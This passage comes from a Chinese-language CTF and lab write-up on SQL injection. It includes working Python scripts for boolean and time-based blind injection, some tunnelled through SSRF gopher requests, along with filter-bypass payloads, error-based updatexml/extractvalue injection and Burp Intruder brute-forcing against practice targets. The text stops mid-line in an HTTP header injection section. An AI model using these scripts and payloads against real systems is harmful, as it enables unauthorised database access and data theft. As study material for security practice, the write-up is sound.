src="/2023/02/09/SQLI/image-20230411013245234.png"></p><p>emmm。。这时候突然想起来SQLI页面是不是有过滤来着赶紧打开看了眼</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/union| /i&quot;</span>,<span class="hljs-variable">$id</span>))<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;You bad bad &gt;_&lt;&#x27;</span>);<br></code></pre></td></tr></table></figure><p>看来是ban掉了union和空格。难怪，那改成<code>content = &quot;id=1/**/and/**/1=1&quot;</code>绕过空格过滤，回显<code>&quot;Welcome! meow meow meow~1&quot;</code>，改成<code>content = &quot;id=1/**/and/**/1=2&quot;</code>，回显<code>&quot;Welcome! 1&quot;</code>。sql语句判断为真会返回<code>&quot;Welcome! meow meow meow~1&quot;</code>，为假不含<code>meow meow meow~</code>，同时union被ban了，尝试用加号拼接<code>&quot;uni&quot;</code>,<code>&quot;on&quot;</code>，结果加号url编码与空格相同（悲，现在意图也比较明显了，布尔盲注。</p><p>完善脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.parse<br><span class="hljs-keyword">import</span> requests<br>url = <span class="hljs-string">&quot;http://192.168.150.1:43083/curl.php&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">126</span>):<br>    content = <span class="hljs-string">&quot;id=1 and (length(database())=&#123;&#125;)#&quot;</span>.<span class="hljs-built_in">format</span>(i)<br>    content = content.replace(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-string">&quot;/**/&quot;</span>)<span class="hljs-comment">#SQL页面存在空格过滤用/**/绕过</span><br>    content_length = <span class="hljs-built_in">len</span>(content)<br>    data = \<span class="hljs-comment">#切记切记下面字符串每行左边要贴边，不然tab会被编码</span><br><span class="hljs-string">f&quot;&quot;&quot;POST /sqli.php HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1</span><br><span class="hljs-string">Content-Length: <span class="hljs-subst">&#123;content_length&#125;</span></span><br><span class="hljs-string">Cache-Control: max-age=0</span><br><span class="hljs-string">Upgrade-Insecure-Requests: 1</span><br><span class="hljs-string">Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-string">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36</span><br><span class="hljs-string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="hljs-string">Accept-Encoding: gzip, deflate</span><br><span class="hljs-string">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="hljs-string">Connection: close</span><br><span class="hljs-string"></span><br><span class="hljs-string"><span class="hljs-subst">&#123;content&#125;</span></span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>    result = urllib.parse.quote(data)<br>    result = result.replace(<span class="hljs-string">&quot;%0A&quot;</span>,<span class="hljs-string">&quot;%0D%0A&quot;</span>)<br>    payload = <span class="hljs-string">&quot;gopher://127.0.0.1:80/_&quot;</span>+result<span class="hljs-comment">#用python直接传参只需要编码一次</span><br>    r = requests.post(url,data=&#123;<span class="hljs-string">&quot;url&quot;</span>:payload&#125;).text<br>    <span class="hljs-comment">#print(r)</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;meow&quot;</span> <span class="hljs-keyword">in</span> r:<span class="hljs-comment">#如果sql返回为真，页面会显示&quot;meow meow~&quot;</span><br>        <span class="hljs-built_in">print</span>(i)<br>        <span class="hljs-keyword">break</span><br><span class="hljs-comment">#output</span><br><span class="hljs-comment">#3</span><br></code></pre></td></tr></table></figure><p>输出3，得出数据库长度为3。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.parse<br><span class="hljs-keyword">import</span> requests<br>url = <span class="hljs-string">&quot;http://192.168.150.1:43083/curl.php&quot;</span><br>database = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>,<span class="hljs-number">126</span>):<br>        content = <span class="hljs-string">&quot;id=1 and (ascii(substr(database(),&#123;&#125;,1))=&#123;&#125;)#&quot;</span>.<span class="hljs-built_in">format</span>(i,j)<span class="hljs-comment">#判断数据库名第i个字符的ascii码是否为j，是的话为真会返回&quot;meow&quot;</span><br>        content = content.replace(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-string">&quot;/**/&quot;</span>)<span class="hljs-comment">#SQL页面存在空格过滤用/**/绕过</span><br>        content_length = <span class="hljs-built_in">len</span>(content)<br>        data = \<br><span class="hljs-string">f&quot;&quot;&quot;POST /sqli.php HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1</span><br><span class="hljs-string">Content-Length: <span class="hljs-subst">&#123;content_length&#125;</span></span><br><span class="hljs-string">Cache-Control: max-age=0</span><br><span class="hljs-string">Upgrade-Insecure-Requests: 1</span><br><span class="hljs-string">Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-string">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36</span><br><span class="hljs-string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="hljs-string">Accept-Encoding: gzip, deflate</span><br><span class="hljs-string">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="hljs-string">Connection: close</span><br><span class="hljs-string"></span><br><span class="hljs-string"><span class="hljs-subst">&#123;content&#125;</span></span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>        result = urllib.parse.quote(data)<br>        result = result.replace(<span class="hljs-string">&quot;%0A&quot;</span>,<span class="hljs-string">&quot;%0D%0A&quot;</span>)<br>        payload = <span class="hljs-string">&quot;gopher://127.0.0.1:80/_&quot;</span>+result<br>        r = requests.post(url,data=&#123;<span class="hljs-string">&quot;url&quot;</span>:payload&#125;).text<br>        <span class="hljs-comment">#print(r)</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;meow&quot;</span> <span class="hljs-keyword">in</span> r:<br>            database += <span class="hljs-built_in">chr</span>(j)<br>            <span class="hljs-built_in">print</span>(database)<br>            <span class="hljs-keyword">break</span><br><span class="hljs-comment">#output</span><br><span class="hljs-comment">#r</span><br><span class="hljs-comment">#ru</span><br><span class="hljs-comment">#rua</span><br><span class="hljs-comment">#数据库名为rua</span><br></code></pre></td></tr></table></figure><p>同样，爆表名，因为可能存在多个表，所以使用<code>group_concat()</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>,<span class="hljs-number">126</span>):<br>        content = <span class="hljs-string">&quot;id=1 and (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database() limit 0,1),&#123;&#125;,1))=&#123;&#125;)#&quot;</span>.<span class="hljs-built_in">format</span>(i,j)<br>        ...........<br><span class="hljs-comment">#output</span><br><span class="hljs-comment">#f</span><br><span class="hljs-comment">#fl</span><br><span class="hljs-comment">#fla</span><br><span class="hljs-comment">#flag</span><br><span class="hljs-comment">#flag,</span><br><span class="hljs-comment">#flag,m</span><br><span class="hljs-comment">#flag,me</span><br><span class="hljs-comment">#flag,mes</span><br><span class="hljs-comment">#flag,mess</span><br><span class="hljs-comment">#flag,messa</span><br><span class="hljs-comment">#flag,messag</span><br><span class="hljs-comment">#flag,message</span><br><span class="hljs-comment">#flag,messages</span><br></code></pre></td></tr></table></figure><p>盲猜flag在flag表里，爆字段名：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>,<span class="hljs-number">126</span>):<br>        content = <span class="hljs-string">&quot;id=1 and (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name = &#x27;flag&#x27;),&#123;&#125;,1))=&#123;&#125;)#&quot;</span>.<span class="hljs-built_in">format</span>(i,j)<span class="hljs-comment">#爆字段名</span><br>        ...........<br><span class="hljs-comment">#output</span><br><span class="hljs-comment">#f</span><br><span class="hljs-comment">#fl</span><br><span class="hljs-comment">#fla</span><br><span class="hljs-comment">#flag</span><br></code></pre></td></tr></table></figure><p>已知信息：</p><p>数据库rua、表flag、字段flag，爆flag内容：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>,<span class="hljs-number">126</span>):<br>        content = <span class="hljs-string">&quot;id=1 and (ascii(substr((select group_concat(flag) from flag),&#123;&#125;,1))=&#123;&#125;)#&quot;</span>.<span class="hljs-built_in">format</span>(i,j)<span class="hljs-comment">#爆flag表内容</span><br></code></pre></td></tr></table></figure><p><img src="/2023/02/09/SQLI/image-20230412103314980.png"></p><p>拿到flag，本题还可以用二分法优化算法，附上L1ao学长的脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.parse<br><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fuck</span>():<br>    url = <span class="hljs-string">&quot;http://192.168.150.1:43083/curl.php&quot;</span><br>    result=<span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">1290</span>):<br>        head=<span class="hljs-number">32</span><br>        tail=<span class="hljs-number">127</span><br>        <span class="hljs-keyword">while</span> head&lt;tail:<br>            mid=(head+tail)&gt;&gt;<span class="hljs-number">1</span><br>            sqli = <span class="hljs-string">&quot;1/**/and/**/if(ascii(substr((seleCt(group_concat(schema_name))from(information_schema.schemata)),&#123;&#125;,1))&gt;&#123;&#125;,1,0)%23&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)<br>            sqli = <span class="hljs-string">&quot;1/**/and/**/if(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=&#x27;rua&#x27;),&#123;&#125;,1))&gt;&#123;&#125;,1,0)%23&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)<br>            sqli = <span class="hljs-string">&quot;1/**/and/**/if(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name)=&#x27;flag&#x27;),&#123;&#125;,1))&gt;&#123;&#125;,1,0)%23&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)<br>            sqli = <span class="hljs-string">&quot;1/**/and/**/if(ascii(substr((seLect(flag)from(rua.flag)),&#123;&#125;,1))&gt;&#123;&#125;,1,0)%23&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)<br>            <span class="hljs-built_in">id</span> = urllib.parse.quote(sqli)<br>            id_length = <span class="hljs-built_in">len</span>(<span class="hljs-built_in">id</span>)+<span class="hljs-number">3</span><br>            payload = <span class="hljs-string">f&quot;&quot;&quot;POST /sqli.php HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1</span><br><span class="hljs-string">Content-Length: <span class="hljs-subst">&#123;id_length&#125;</span></span><br><span class="hljs-string">Cache-Control: max-age=0</span><br><span class="hljs-string">Upgrade-Insecure-Requests: 1</span><br><span class="hljs-string">Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-string">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36</span><br><span class="hljs-string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="hljs-string">Accept-Encoding: gzip, deflate</span><br><span class="hljs-string">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="hljs-string">Connection: close</span><br><span class="hljs-string"></span><br><span class="hljs-string">id=<span class="hljs-subst">&#123;<span class="hljs-built_in">id</span>&#125;</span></span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>            <span class="hljs-comment"># print(payload)</span><br>            tmp = urllib.parse.quote(payload)<br>            new = tmp.replace(<span class="hljs-string">&quot;%0A&quot;</span>,<span class="hljs-string">&quot;%0D%0A&quot;</span>)<br>            res = <span class="hljs-string">&#x27;gopher://127.0.0.1:80/_&#x27;</span> + new<br>            dataa = &#123;<br>                <span class="hljs-string">&quot;url&quot;</span>:res<br>            &#125;<br>            r = requests.post(url=url,data=dataa)<br>            <span class="hljs-comment"># print(r.text)</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;meow meow meow&quot;</span> <span class="hljs-keyword">in</span> r.text:<br>                head=mid+<span class="hljs-number">1</span><br>            <span class="hljs-keyword">else</span>:<br>                tail=mid<br>        <span class="hljs-keyword">if</span> head !=<span class="hljs-number">32</span>:<br>            result+=<span class="hljs-built_in">chr</span>(head)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">break</span>   <br>        <span class="hljs-built_in">print</span>(result)<br>fuck()<br></code></pre></td></tr></table></figure><p>当然，看到尝试传入递增变化的数据，bp爆破有时候也不失为一种方法（会用工具真的很重要（哭</p><p>（感谢LinTu提供的思路）</p><p><img src="/2023/02/09/SQLI/image-20230412130046708.png"></p><p>浏览器发送一次请求，bp抓包。记住python出payload的时候要url编码两次，传到Intruder。</p><p><img src="/2023/02/09/SQLI/image-20230412130722783.png"></p><p><img src="/2023/02/09/SQLI/image-20230412130832052.png"></p><p><img src="/2023/02/09/SQLI/image-20230412130852364.png"></p><p>Intruder集束炸弹走起，两个爆破点一个是需判断字符的位置(从1开始)，一个是比较的ascii码(从32到126)。开始爆破</p><p><img src="/2023/02/09/SQLI/image-20230412130941926.png"></p><p>异样流量数据包对应Payload2按照Payload1顺序编码成字符，就是对应的flag了，因为bp是多线程，所以也不会很慢。也算提供了一种新思路吧。</p><hr><h2 id="2023ROIS夏令营"><a href="#2023ROIS夏令营" class="headerlink" title="2023ROIS夏令营"></a>2023ROIS夏令营</h2><h3 id="sqli靶场"><a href="#sqli靶场" class="headerlink" title="sqli靶场"></a>sqli靶场</h3><p>先试单双引号，有报错说明原结构被破坏，则为该引号闭合，都没反应，可能是数字型。再加注释符(–、–+、#都有可能，注意浏览器中从表单提交可能被url编码，可以从hackbar或者bp提交表单)，如果还是报错，则可能存在括号闭合，加括号报错消失之后试下两个语句，<code>or 1=1，or 1=0</code>以及<code>order by ...</code>后者查列数，前者如果结果有所不同则存在布尔注入利用，之后可尝试联合注入、布尔盲注，如果页面始终都没发生变化，则试下时间注入。不存在报错将所有可能情况都试下(<code>&#39; or 1=1/0#</code>、<code>&quot; or 1=1/0#</code>、<code>&quot;) or 1=1/0#</code>、<code>&#39;) or 1=1/0#</code>、<code>&#39;)) or 1=1/0#</code>、<code>&quot;)) or 1=1/0#</code>、)</p><p>常见闭合：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 、">&#x27;、 &quot;、&#x27;)、&quot;)、&#x27;))、&quot;))<br></code></pre></td></tr></table></figure><h4 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h4><p>发现不管输入什么页面显示的东西都是一样的，这个时候布尔盲注就不适合我们用。布尔盲注适合页面对于错误和正确结果有不同反应。如果页面一直不变这个时候我们可以使用时间注入，时间注入和布尔盲注两种没有多大差别只不过时间盲注多了<code>if()</code>函数和<code>sleep()</code>函数。<code>if(a,sleep(10),1)</code>如果a结果是真的，那么执行sleep(10)页面延迟10秒，如果a的结果是假，执行1，页面不延迟。通过页面时间来判断出id参数是单引号字符串。<br><img src="/2023/02/09/SQLI/image-20230715155500241.png">(%3C和%3E是<code>&lt;&gt;</code>，被编码了hhh)<img src="/2023/02/09/SQLI/image-20230715155607903.png"></p><p>可以看到如果判断长度不为8，刷的一下就加载完了，但是如果数据库名长度等于八就延迟十秒</p><p>后面的操作就类似了</p><p>在利用python编写脚本的时候要利用到time模块：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&#x27;http://124.70.99.199:3456/Less-9/&#x27;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sqli</span>():<br>    length = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">15</span>):<br>        start_time = time.time()<br>        payload = <span class="hljs-string">f&quot;&quot;&quot;?id=1&#x27; and if(length(database())=<span class="hljs-subst">&#123;i&#125;</span>,sleep(2),1)--+&quot;&quot;&quot;</span><br>        r = requests.get(url+payload)<br>        end_time = time.time()<br>        exec_time = end_time - start_time<br>        <span class="hljs-keyword">if</span> exec_time&gt;<span class="hljs-number">2</span>:<br>            <span class="hljs-built_in">print</span>(i)<br>            <span class="hljs-keyword">break</span><br><br>sqli()<br></code></pre></td></tr></table></figure><h4 id="level17"><a href="#level17" class="headerlink" title="level17"></a>level17</h4><p>报错注入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs mysql">updatexml(target_xml,xpath_string,new_value)<br>#target_xml:需要更新的xml数据，可以是xml类型的列或变量<br>#xpath_string:xpath表达式，用于指定要更新的节点或属性<br>#new_value:新的值， 用于替换目标节点或属性的值<br>#示例：<br>update your_table set xml_culumn = updatexml(xml_column,&#x27;/root/user[1]/name&#x27;,&#x27;Potatowo&#x27;) where id = 1;<br>#上述示例中your_table是要更新的表，xml_column是包含xml数据的列名,/root/user[1]/name是xpath表达式，指定要更新的节点路径，&#x27;Potatowo&#x27;是设置的新的值<br><br>extractvalue(xml_data,xpath_string)<br>#xml_data：xml数据，可以是xml类型的列或变量<br>#xpath_string:xpath表达式，用于指定要提取的节点<br>#函数根据提供的xpath表达式在xml数据中查找匹配的节点，并返回该节点的文本值<br><br>#一个有效的xpath表达式应该满足以下要求：<br>#以节点测试、函数、运算符或路径表达式开头<br>#路径表达式应以节点轴或节点名称开始<br><br>#若不满足xpath语法，则会报错，如果xpath为sql语句，mysql会执行，并将执行结果返回在报错中<br></code></pre></td></tr></table></figure><p><img src="/2023/02/09/SQLI/image-20230716210307686.png"></p><p>测试注入点的时候发现无论如何都没有反应，都只出现上图的情况，当用户名为’admin’或’Dumb’时密码输入什么都行，懵逼了挺久的，然后看了眼这个<img src="/2023/02/09/SQLI/image-20230716210541431.png"></p><p>啊原来是修改密码啊。。。真tm</p><p>既然是修改密码，后端一定存在update语句，修改的是password，猜测传入的password存在引号闭合，随手试了下，</p><p><img src="/2023/02/09/SQLI/image-20230716211039043.png"></p><p>，当然此处的用户名必须是admin或者Dumb，到最后一步查表内容时出问题了</p><p><img src="/2023/02/09/SQLI/image-20230716211543520.png"></p><p>看了眼大佬博客了解到mysql修改和查询不能是同一张表，因此可以引入一个临时表(详情去看<a href="https://potatowo233.github.io/2023/07/09/ROIS-Summer/">另一篇博客</a>)，然后又踩坑(不过还好，报错的意思就是说临时表必须起别名，问题不大</p><p><img src="/2023/02/09/SQLI/image-20230716212625454.png"></p><p>一开始还在纳闷怎么没有admin，观察后发现好像输出字数被限制了，如果想尽可能完整获取数据库中的信息，可以用<code>not in</code>运算符把以及显示出来的用户名排除掉</p><p><img src="/2023/02/09/SQLI/image-20230716213520875.png"></p><p>如下，查出来的满满都是admin（，看来懵逼时瞎尝试的次数不少（</p><p><img src="/2023/02/09/SQLI/image-20230716214135001.png"></p><p>换成updatexml()函数试下，注意新加入的’*****‘参数</p><p><img src="/2023/02/09/SQLI/image-20230716214432222.png"></p><p><strong>想了一下，之前能够回显错误信息的不是都可以用报错注入吗？(脑袋发光)，好像比盲注效率高了不少</strong></p><p>这道题看大佬博客好像都审计了一眼源代码，于是跟着学习了下，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_input</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$value</span>))<br>&#123;<br><span class="hljs-comment">// truncation (see comments)</span><br><span class="hljs-variable">$value</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$value</span>,<span class="hljs-number">0</span>,<span class="hljs-number">15</span>);<br>&#125;<br><br><span class="hljs-comment">// Stripslashes if magic quotes enabled</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">get_magic_quotes_gpc</span>())<br>&#123;<br><span class="hljs-variable">$value</span> = <span class="hljs-title function_ invoke__">stripslashes</span>(<span class="hljs-variable">$value</span>);<br>&#125;<br><br><span class="hljs-comment">// Quote if not a number</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">ctype_digit</span>(<span class="hljs-variable">$value</span>))<br>&#123;<br><span class="hljs-variable">$value</span> = <span class="hljs-string">&quot;&#x27;&quot;</span> . <span class="hljs-title function_ invoke__">mysql_real_escape_string</span>(<span class="hljs-variable">$value</span>) . <span class="hljs-string">&quot;&#x27;&quot;</span>;<br>&#125;<br><br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-variable">$value</span> = <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$value</span>);<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-variable">$value</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">get_magic_quotes_gpc</span>())<br>&#123;<br><span class="hljs-variable">$value</span> = <span class="hljs-title function_ invoke__">stripslashes</span>(<span class="hljs-variable">$value</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>其中<code>get_magic_quotes_gpc()</code>函数的作用是判断<code>get_magic_quotes_gpc()</code>是否开启，如果开启的话会给用户传入的信息添加上转义字符’\‘，，<code>stringslashes()</code>则是去掉转义字符，这个方法在新版本的php中已经被废弃了，也盲学一下，增长见识。</p><h4 id="HTTP头注入："><a href="#HTTP头注入：" class="headerlink" title="HTTP头注入："></a>HTTP头注入：</h4><p>看一眼源代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT  users.username, users.password FROM users WHERE users.username=<span class="hljs-subst">$uname</span> and users.password=<span class="hljs-subst">$passwd</span> ORDER BY users.id DESC LIMIT 